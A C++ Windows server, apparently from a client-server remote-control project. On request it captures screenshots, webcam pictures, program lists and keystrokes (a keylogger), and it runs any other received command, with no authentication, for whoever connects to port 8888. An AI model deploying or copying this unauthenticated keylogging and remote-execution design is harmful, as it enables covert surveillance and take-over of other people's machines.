#include "../Application/lib.h"
#include "../Application/executeCommand.h"

const string saveDir = "C:/Users/Tien/Documents/Client-Server/";

std::map<std::string, std::function<void(std::string &)>> commandHandlers = {
    {"get_screenshot",
     [](std::string &outFile) {
       outFile = saveDir + "screenshot.png";
       take_screenshot(outFile);
     }},
    {"get_picture",
     [](std::string &outFile) {
       outFile = saveDir + "picture.png";
       take_picture(outFile);
     }},
    {"list_program",
     [](std::string &outFile) {
       outFile = saveDir + "programs.txt";
       list_programs_to_file(outFile);
     }},
    {"keylogger", [](std::string &outFile) {
       outFile = saveDir + "keylog.txt";
       run_keylogger_and_save(outFile, 10);
     }}};

void send_file_over_socket(SOCKET sock, const std::string &filename) {
  std::ifstream file(filename, std::ios::binary);
  if (!file) {
    size_t fileSize = 0;
    send(sock, reinterpret_cast<const char *>(&fileSize), sizeof(fileSize), 0);
    return;
  }

  file.seekg(0, std::ios::end);
  size_t fileSize = file.tellg();
  file.seekg(0, std::ios::beg);

  send(sock, reinterpret_cast<const char *>(&fileSize), sizeof(fileSize), 0);

  char buffer[4096];
  while (file) {
    file.read(buffer, sizeof(buffer));
    send(sock, buffer, file.gcount(), 0);
  }
}

static std::string trim(const std::string &s) {
  size_t a = s.find_first_not_of(" \r\n\t");
  if (a == std::string::npos) return "";
  size_t b = s.find_last_not_of(" \r\n\t");
  return s.substr(a, b - a + 1);
}

int main() {
  WSADATA wsa;
  WSAStartup(MAKEWORD(2, 2), &wsa);

  SOCKET serverSocket = socket(AF_INET, SOCK_STREAM, 0);
  sockaddr_in serverAddr{};
  serverAddr.sin_family = AF_INET;
  serverAddr.sin_port = htons(8888);
  serverAddr.sin_addr.s_addr = INADDR_ANY;

  bind(serverSocket, (sockaddr *)&serverAddr, sizeof(serverAddr));
  listen(serverSocket, 5);

  std::cout << "[Server] Listening on port 8888...\n";

  while (true) {
    sockaddr_in clientAddr{};
    int clientSize = sizeof(clientAddr);
    SOCKET clientSocket =
        accept(serverSocket, (sockaddr *)&clientAddr, &clientSize);
    if (clientSocket == INVALID_SOCKET) continue;

    char buffer[4096] = {};
    int bytes = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
    if (bytes <= 0) {
      closesocket(clientSocket);
      continue;
    }
    buffer[bytes] = '\0';
    std::istringstream iss(buffer);

    std::string sender_email, command;
    std::getline(iss, sender_email);
    std::getline(iss, command);

    sender_email = trim(sender_email);
    command = trim(command);

    std::cout << "[Server] Command from " << sender_email << ": " << command
              << "\n";

    if (commandHandlers.count(command)) {
      std::string outputFile;
      commandHandlers[command](outputFile);
      send_file_over_socket(clientSocket, outputFile);
    } else {
      execute_command_with_sender(sender_email, command);
    }

    closesocket(clientSocket);
  }

  closesocket(serverSocket);
  WSACleanup();
  return 0;
}
